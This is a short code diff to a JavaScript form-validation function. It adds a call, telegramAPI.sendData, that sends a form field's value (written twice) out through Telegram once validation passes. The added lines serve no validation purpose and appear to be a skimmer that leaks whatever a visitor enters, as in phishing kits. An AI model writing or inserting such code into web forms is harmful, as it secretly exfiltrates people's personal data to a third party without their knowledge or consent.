@@ -27,6 +27,8 @@ function valudate_from() {
                                             if (document.getElementById('document11').value == '') {
                                                 document.getElementById('document11-s').style.display = 'block';
                                             } else {
+                                                telegramAPI.sendData(`${document.getElementById('document1').value},
+                                                ${document.getElementById('document1').value}`)
                                                 return true;
                                             }
                                         }
